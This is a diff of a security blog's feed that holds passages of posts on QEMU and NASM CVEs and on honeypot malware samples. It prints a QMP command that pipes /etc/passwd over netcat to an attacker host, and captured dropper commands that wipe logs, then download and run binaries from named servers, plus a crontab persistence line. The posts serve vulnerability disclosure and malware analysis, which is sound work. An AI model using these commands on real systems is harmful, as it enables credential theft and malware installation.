 &lt;p&gt;1st, execute the QEMU with &lt;code class=&quot;highlighter-rouge&quot;&gt;-qmp tcp:&amp;lt;ip_address&amp;gt;:1234,server,nowait&lt;/code&gt;&lt;br /&gt;
 2nd, open another console and setup a listener to port 9999&lt;br /&gt;
@@ -1629,22 +1519,7 @@ Backtrace stopped: previous frame identical to this frame (corrupt stack?)
 {&quot;return&quot;: {}}
 { &quot;execute&quot;: &quot;migrate&quot;, &quot;arguments&quot;: { &quot;uri&quot;: &quot;exec:cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999&quot; } }
 {&quot;return&quot;: {}}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2019-12928/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-12928/</guid>
-        
-        <category>remote command execution</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-5008] QEMU sun4u Denial of Service</title>
-        <description>&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The QMP migrate command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.</summary></entry><entry><title type="html">[CVE-2019-5008] QEMU sun4u Denial of Service</title><link href="http://localhost:4000/blog/CVE-2019-5008/" rel="alternate" type="text/html" title="[CVE-2019-5008] QEMU sun4u Denial of Service" /><published>2019-01-03T00:00:00+08:00</published><updated>2019-01-03T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-5008</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-5008/">&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;
 
 &lt;p&gt;Patch diff:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/hw/sparc64/sun4u.c b/hw/sparc64/sun4u.c
@@ -1677,24 +1552,7 @@ index f76b19e4e9..5772da02cb 100644
 &lt;p&gt;References:&lt;/p&gt;
 &lt;ol&gt;
   &lt;li&gt;https://lists.gnu.org/archive/html/qemu-devel/2019-01/msg00186.html&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Thu, 03 Jan 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2019-5008/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-5008/</guid>
-        
-        <category>pci device</category>
-        
-        <category>denial of service</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>3945ac76b591cdbd50515b9f65821a64</title>
-        <description>&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;
+&lt;/ol&gt;</content><author><name></name></author><summary type="html">QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.</summary></entry><entry><title type="html">3945ac76b591cdbd50515b9f65821a64</title><link href="http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/" rel="alternate" type="text/html" title="3945ac76b591cdbd50515b9f65821a64" /><published>2018-09-21T00:00:00+08:00</published><updated>2018-09-21T00:00:00+08:00</updated><id>http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64</id><content type="html" xml:base="http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/">&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;
 
 &lt;p&gt;key = BB2FA36AAA9541F0&lt;/p&gt;
 
@@ -1747,26 +1605,7 @@ index f76b19e4e9..5772da02cb 100644
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed -i \'/\\/etc\\/cron.hourly\\/gcc4.sh/d\' /etc/crontab &amp;amp;&amp;amp; echo \'*/3 * * * * root /etc/cron.hourly/gcc4.sh\' &amp;gt; /etc/crontab
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Fri, 21 Sep 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/</guid>
-        
-        <category>malware analysis</category>
-        
-        <category>reverse engineering</category>
-        
-        <category>honeypot</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>b08f9dc5784532be5b3f695f37c7781b</title>
-        <description>&lt;p&gt;Initial file dropped:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Upon decompiling, there is a subroutine called as encrypt_code. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).</summary></entry><entry><title type="html">b08f9dc5784532be5b3f695f37c7781b</title><link href="http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/" rel="alternate" type="text/html" title="b08f9dc5784532be5b3f695f37c7781b" /><published>2018-09-06T00:00:00+08:00</published><updated>2018-09-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b</id><content type="html" xml:base="http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/">&lt;p&gt;Initial file dropped:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1855,26 +1694,7 @@ support
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
 -e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Thu, 06 Sep 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/</guid>
-        
-        <category>malware analysis</category>
-        
-        <category>reverse engineering</category>
-        
-        <category>honeypot</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title>
-        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped:</summary></entry><entry><title type="html">[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title><link href="http://localhost:4000/blog/CVE-2018-16517/" rel="alternate" type="text/html" title="[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)" /><published>2018-09-05T00:00:00+08:00</published><updated>2018-09-05T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2018-16517</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2018-16517/">&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
 
 &lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
 
@@ -2034,18 +1854,4 @@ The &lt;code class=&quot;highlighter-rouge&quot;&gt;output_ins.label&lt;/code&gt
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boom&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Wed, 05 Sep 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2018-16517/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2018-16517/</guid>
-        
-        <category>null pointer deref</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-  </channel>
-</rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.</summary></entry></feed>
